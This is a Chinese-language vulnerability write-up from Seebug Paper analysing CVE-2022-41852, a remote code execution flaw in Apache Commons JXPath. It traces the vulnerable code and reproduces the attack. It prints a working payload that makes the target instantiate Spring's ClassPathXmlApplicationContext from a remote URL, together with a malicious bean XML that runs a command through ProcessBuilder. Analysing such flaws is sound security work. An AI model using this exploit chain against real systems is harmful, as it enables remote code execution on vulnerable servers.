**作者：xxhzz@星阑科技PortalLab  
原文链接：<https://mp.weixin.qq.com/s/L1GyToB0pYaKua8FZi9tiw>**

## **项目介绍**

Apache Commons JXPath是美国阿帕奇（Apache）基金会的一种 XPath 1.0 的基于 Java 的实现。JXPath 为使用
XPath 语法遍历 JavaBeans、DOM 和其他类型的对象的图形提供了 API。

## **漏洞描述**

Apache Commons JXPath
存在安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext类函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。

![](https://images.seebug.org/content/images/2022/10/49542a22-322d-4010-aed5-8badc83d71c7.png-w331s)

## **利用范围**

Apache Commons JXpath <= 1.3

## **漏洞分析**

### **环境搭建**

使用github上POC进行分析复现<https://github.com/Warxim/CVE-2022-41852>

![](https://images.seebug.org/content/images/2022/10/a157152b-f76c-44b9-b9f3-0ac57b357889.png-w331s)

漏洞POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。

### **前置知识**

在漏洞分析之前，首先了解一下JXPath及用法（参考官网用户指南：<https://commons.apache.org/proper/commons-jxpath/users-guide.html>）

![](https://images.seebug.org/content/images/2022/10/0de5b98a-e38d-4806-925b-7bf64c3a75db.png-w331s)

JXPath除了能够像XPatth一样能够访问XML文档各种元素之外，还能够读取和写入JavaBean的属性，获取和设置数组、集合、映射、透明容器、Servlet
中的各种上下文对象等元素。

JXPath 支持开箱即用的标准 XPath 函数。它还支持“标准”扩展函数（基本上是通往 Java 的桥梁），以及完全自定义的扩展函数。

![](https://images.seebug.org/content/images/2022/10/8129ab31-ecfa-4e54-b1d2-cf95d58a0f27.png-w331s)

### **代码分析**

JXPath支持自定义扩展函数，首先看一下PackageFunctions这个类

![](https://images.seebug.org/content/images/2022/10/2a604c7f-dc4e-419c-8220-4adc15e14c0e.png-w331s)

在org.apache.commons.jxpath.PackageFunctions#getFunction中，存在methodName.equals("new"）

![](https://images.seebug.org/content/images/2022/10/fa8baefe-1894-4ca0-8cf5-180ab60e2960.png-w331s)

这里实例化的xpath表达式设置为了xxx.new()，截取括号前作为方法名，如果调用new方法就被视为实例化，两个判断一个是实例化构造函数，另一个是静态方法。

往下分析，如果是实例化构造函数，在Spring框架中可通过加载远程配置实现命令执行，这里使用org.springframework.context.support.ClassPathXmlApplicationContext类，构造payload：

org.springframework.context.support.ClassPathXmlApplicationContext.new("<http://127.0.0.1:8001/test.xml>")

恶意的xml文件使用Spring-bean，设置init-method实现RCE

    
    
    "http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
                <list>
                    <value>cmd</value>
                    <value>/c</value>
                    <value><![CDATA[calc]]></value>
                </list>
            </constructor-arg>
        </bean>
    </beans>

在实例化之后，继续跟进会来到org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue

![](https://images.seebug.org/content/images/2022/10/e0ad0f2b-e416-4558-a9d9-f4f7803a9755.png-w331s)

在获得了org.apache.commons.jxpath.Function对应的这个实例后，会调?具体的invoke实现。

![](https://images.seebug.org/content/images/2022/10/f4e98c9a-1bff-426d-bf21-24ef9634d6fe.png-w331s)

![](https://images.seebug.org/content/images/2022/10/a3d0ad69-18a0-4eb2-934f-a7f177f80f01.png-w331s)

最后在调用invoke实现Spring-bean加载，执行恶意代码。

![](https://images.seebug.org/content/images/2022/10/4e5251d1-6483-4f00-ad33-181b20bfd5f3.png-w331s)

Spring框架中还可以用org.apache.commons.jxpath.functions.MethodFunction这个类。

除了实例化构造函数，Spring框架加载恶意配置的利用之外。还能利用静态方法进行RCE，例如jndi、jdbc等，后续笔者也会进行补充和分析。

当然在官方介绍中说明，除了构造函数和使用静态方法，还介绍了一种调用。

![](https://images.seebug.org/content/images/2022/10/06932b63-97de-46b1-9d74-161a5640b5d1.png-w331s)

此调用也可以直接利用getValue解析表达式。

### **漏洞复现**

在Spring中利用远程加载配置来命令执行。

构造test.xml

![](https://images.seebug.org/content/images/2022/10/8399272a-cf30-4f19-b137-9d87aaa0236f.png-w331s)

本地用python开启http服务，模拟远程加载。

![](https://images.seebug.org/content/images/2022/10/7c8e06f7-40ab-447c-9667-a0ec926684ce.png-w331s)

成功命令执行。

![](https://images.seebug.org/content/images/2022/10/82563fbb-757a-4e6a-b300-cc1ccab4fa15.png-w331s)

## **修复建议**

目前官方已经停止更新，无修复版本。

## **参考材料**

1.<https://github.com/Warxim/CVE-2022-41852>

2.<https://commons.apache.org/proper/commons-jxpath/users-guide.html>

3.<https://github.com/advisories/GHSA-wrx5-rp7m-mm49>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1992/>

